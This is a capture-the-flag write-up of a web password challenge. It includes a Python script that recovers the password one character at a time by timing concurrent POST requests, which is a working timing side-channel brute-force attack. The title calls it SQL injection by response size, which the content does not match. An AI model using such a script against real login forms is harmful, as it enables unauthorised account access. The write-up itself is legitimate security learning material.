---
title: SQL Injection By Reponse Size
created: 2021-09-03
tags:
  - 'ctf'
  - 'sqli'
  - 'web'
--- 


- So in this challenge we have only an address `http://139.59.46.128:2345/` & there is a field to submit password.
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/1.png)
- If we try to enter something we obviously get an error `Incorrect Password`.Look at the developer console we can see the form is sending a post request with a post parameter `password`.
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/2.png)
- We can try sql injection payload and also test for xss & all but noting.
- At this point I had no idea about what to do. I tried bruteforcing passwords(using worldlists). Nothing happened.
- I tried sending one character at a time using burp and
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/3.png)
- If we enable `Response received` we can see `e` took the longest time to give a response & it's not random if we run this multiple time we can still see `e` took the longest to give back a response
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/4.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/8.png)
- We can attack one character at a time. But it'll take a great effort to do this manually with burp so I made a script

```python
#!/usr/bin/python3
from requests_futures.sessions import FuturesSession
from concurrent.futures import as_completed
import string
from requests import post

char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + '{' + '}'  
url = "http://139.59.46.128:2345/"

flag = ''
#flag = 'enc0re{5'

print("[*]Getting the password.......")
with FuturesSession(max_workers=len(char_set)) as session:
    stat = {}
    while not flag.endswith("}"):
        threads = [
                    session.post(url, data={"password": f"{flag + char}"}) 
                    for char in char_set
                ]

        flag += max(zip((thread.result().elapsed.total_seconds() for thread in threads), char_set))[1]
        print(f"[*]Password: {flag}")

print(f"[!]Password: {flag}")

print("[*]Submitting the flag....")

r = post(url, data={"password":f"{flag}"})

print(r.text)

```

- The concept is simple we're bruteforcing one character at a time and looking for the one which takes the longest to give a response back & adding it to the flag variable(string) & we're using multiprocessing([future library](https://pythonrepo.com/repo/ross-requests-futures-python-working-with-http))
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/5.png)
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/7.png)
- Running the script we got the flag
- ![](https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/6.png)
